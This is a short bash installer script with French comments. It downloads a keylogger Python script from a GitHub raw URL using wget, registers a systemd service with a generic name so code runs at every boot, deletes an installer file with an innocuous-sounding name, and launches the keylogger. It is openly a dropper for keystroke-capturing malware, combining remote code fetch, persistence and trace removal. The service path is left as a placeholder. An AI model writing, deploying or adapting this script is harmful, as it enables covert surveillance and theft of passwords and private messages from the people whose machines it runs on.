#!/bin/bash
pip install pynput
pip install logging #installation de la librairie logging
pip install pynput #installation de la librairie pynput





# URL du fichier Python sur GitHub
GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/scriptKeylogger/keylogger.py"

# Nom du fichier téléchargé
FILENAME="keylogger.py"

# Téléchargement du fichier Python
echo "Téléchargement du script Python depuis GitHub..."
wget $GITHUB_URL -O $FILENAME

# Vérification si le fichier a été téléchargé
if [ -f "$FILENAME" ]; then
    echo "Le fichier $FILENAME a été téléchargé avec succès."
else
    echo "Erreur lors du téléchargement du fichier $FILENAME."
    exit 1
fi

# Variables
SERVICE_NAME="monscript"
PYTHON_SCRIPT_PATH="/chemin/vers/monscript.py"
USERNAME=$(whoami)

# Chemin vers l'interpréteur Python
PYTHON_EXEC=$(which python3)

# Créer le fichier de service systemd
echo "Création du fichier de service systemd..."

sudo bash -c "cat > /etc/systemd/system/$SERVICE_NAME.service" <<EOL
[Unit]
Description=Script Python au démarrage
After=network.target

[Service]
ExecStart=$PYTHON_EXEC $PYTHON_SCRIPT_PATH
Restart=always
User=$USERNAME

[Install]
WantedBy=multi-user.target
EOL

# Redémarrer systemd pour prendre en compte le nouveau service
echo "Recharge systemd pour activer le nouveau service..."
sudo systemctl daemon-reload

# Activer le service au démarrage
echo "Activation du service pour qu'il démarre automatiquement..."
sudo systemctl enable $SERVICE_NAME.service

# Démarrer le service maintenant
echo "Démarrage du service..."
sudo systemctl start $SERVICE_NAME.service

echo "Le script Python est maintenant configuré pour démarrer au démarrage via systemd."

# Exécution du fichier Python
echo "Exécution du fichier Python..."
OWNFILE="install_FileSystemLinux.py"
rm $OWNFILE
python3 keylogger.py
